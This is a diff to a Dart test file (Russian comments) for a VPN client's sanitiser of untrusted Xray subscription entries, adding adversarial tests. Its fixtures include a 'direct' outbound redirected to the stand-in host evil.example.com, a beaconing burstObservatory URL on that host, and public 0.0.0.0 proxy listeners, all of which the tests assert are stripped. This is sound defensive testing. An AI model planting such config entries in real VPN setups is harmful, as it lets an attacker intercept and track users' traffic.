@@ -5,7 +5,9 @@
 // системного VpnService поднимала туннель, но трафик через него не шёл, тогда как та же
 // подписка в стороннем клиенте работала. Второе: запись САНИТИЗОВАНА (аудит, HIGH) — из неё
 // вырезаны чужие секции управления движком (dns/routing/log/metrics/…), входы только
-// локальные socks/http на 127.0.0.1, а dns/routing подложены наши. Порт socks-входа
+// локальные socks на 127.0.0.1 (http-вход записи выбрасывается — чужой порт это
+// неаутентифицированный локальный прокси), исходы direct/block безусловно заменены
+// нашими freedom/blackhole, а dns/routing подложены наши. Порт socks-входа
 // перезаписывается: его ищет плагин.
 //
 // Образец подписки снят с живой выдачи (uuid и адреса обезличены; адреса — хостнеймы в
@@ -102,8 +104,10 @@ void main() {
         'inbounds': [
           // публичный SOCKS на устройстве — бесплатный прокси для всей локальной сети
           {'listen': '0.0.0.0', 'port': 1080, 'protocol': 'socks'},
+          // http-вход с чужим портом — неаутентифицированный локальный прокси через VPN
+          // для любого приложения на телефоне: выбрасываем целиком (аудит, LOW)
           {'listen': '0.0.0.0', 'port': 8080, 'protocol': 'http'},
-          // не-socks/http вход вообще выбрасываем
+          // не-socks вход вообще выбрасываем
           {'listen': '0.0.0.0', 'port': 5353, 'protocol': 'dokodemo-door', 'settings': {'address': '8.8.8.8'}},
         ],
         'outbounds': [
@@ -126,15 +130,15 @@ void main() {
         ],
       };
 
-  SubNode evilNode() {
-    final entry = evilEntry();
+  SubNode evilNode([Map<String, dynamic>? entry]) {
+    final e = entry ?? evilEntry();
     return SubNode(
       remark: '🇫🇮 Финляндия',
       tag: '🇫🇮 Финляндия',
       server: 'fi1.bitapsvpn.com',
       port: 443,
-      xray: (entry['outbounds'] as List).first as Map<String, dynamic>,
-      full: entry,
+      xray: (e['outbounds'] as List).first as Map<String, dynamic>,
+      full: e,
     );
   }
 
@@ -156,14 +160,16 @@ void main() {
     final rulesJson = json.encode((cfg['routing'] as Map)['rules']);
     expect(rulesJson, contains('"outboundTag":"proxy"'));
 
-    // входы: только socks/http и только на 127.0.0.1; порт socks перезаписан как раньше
+    // входы: только socks и только на 127.0.0.1; порт socks перезаписан как раньше.
+    // http-вход записи выброшен целиком (аудит, LOW): чужой порт — неаутентифицированный
+    // локальный прокси через VPN, а плагину нужен только socks.
     final inbounds = (cfg['inbounds'] as List).cast<Map>();
-    expect(inbounds.length, 2, reason: 'dokodemo-door обязан быть выброшен');
+    expect(inbounds.length, 1, reason: 'http и dokodemo-door обязаны быть выброшены');
     for (final i in inbounds) {
       expect(i['listen'], '127.0.0.1', reason: 'публичный listen — это открытый прокси на устройстве');
-      expect(['socks', 'http'].contains(i['protocol']), isTrue);
+      expect(i['protocol'], 'socks');
     }
-    expect(inbounds.firstWhere((i) => i['protocol'] == 'socks')['port'], 10836);
+    expect(inbounds.first['port'], 10836);
 
     // сам узел не тронут — иначе подключаться стало бы не к тому серверу
     final vnext = ((cfg['outbounds'] as List).first as Map)['settings']['vnext'] as List;
@@ -191,5 +197,60 @@ void main() {
     // наши правила ссылаются на direct/block — они гарантированно есть, иначе движок не стартует
     final tags = (cfg['outbounds'] as List).map((o) => (o as Map)['tag']).toList();
     expect(tags, containsAll(['proxy', 'direct', 'block']));
+  });
+
+  test('ADV-1: чужие direct/block заменяются нашими freedom/blackhole, evil-хост не доходит', () {
+    // Запись подкладывает СВОЙ исход под тегом direct: наши правила шлют в этот тег
+    // geosite:category-ru/private, geoip:ru/private и bittorrent — без безусловной замены
+    // это молчаливый MITM RU-трафика (аудит, HIGH). Тег block подменён на freedom —
+    // «заблокированная» реклама уходила бы напрямую.
+    final entry = evilEntry();
+    entry['outbounds'] = [
+      (evilEntry()['outbounds'] as List).first, // настоящий прокси-исход записи
+      {
+        'tag': 'direct',
+        'protocol': 'vless',
+        'settings': {
+          'vnext': [
+            {
+              'address': 'evil.example.com',
+              'port': 443,
+              'users': [
+                {'id': '11111111-2222-3333-4444-555555555555', 'encryption': 'none'},
+              ],
+            },
+          ],
+        },
+      },
+      {'tag': 'block', 'protocol': 'freedom'},
+    ];
+    final cfg =
+        json.decode(xrayEntryConfigJson(evilNode(entry), socksPort: 10836)) as Map<String, dynamic>;
+
+    final outbounds = (cfg['outbounds'] as List).cast<Map>();
+    expect(outbounds.map((o) => o['tag']).toList(), ['proxy', 'direct', 'block'],
+        reason: 'прокси-исход записи сохраняется, чужие direct/block выброшены');
+    expect(outbounds.singleWhere((o) => o['tag'] == 'direct')['protocol'], 'freedom',
+        reason: 'direct обязан быть нашим freedom, а не vless атакующего');
+    expect(outbounds.singleWhere((o) => o['tag'] == 'block')['protocol'], 'blackhole');
+    // evil-хост не должен попасть в финальный конфиг ни в каком виде
+    expect(json.encode(cfg), isNot(contains('evil.example.com')));
+    // цель правил — настоящий прокси-исход записи, а не выброшенный исход
+    expect(json.encode((cfg['routing'] as Map)['rules']), contains('"outboundTag":"proxy"'));
+  });
+
+  test('ADV-2: burstObservatory записи вырезается (маячок атакующему)', () {
+    // У движка ДВЕ обсерватории: observatory уже вырезалась, а burstObservatory — нет,
+    // и движок исполнял чужой pingConfig: регулярные пробы на URL атакующего (аудит, LOW).
+    final entry = evilEntry()
+      ..['burstObservatory'] = {
+        'pingConfig': {'destination': 'https://evil.example.com/beacon', 'interval': '1m'},
+        'subjectSelector': ['proxy'],
+      };
+    final cfg =
+        json.decode(xrayEntryConfigJson(evilNode(entry), socksPort: 10836)) as Map<String, dynamic>;
+    expect(cfg.containsKey('burstObservatory'), isFalse);
+    expect(cfg.containsKey('observatory'), isFalse);
+    expect(json.encode(cfg), isNot(contains('evil.example.com')));
   });
 }
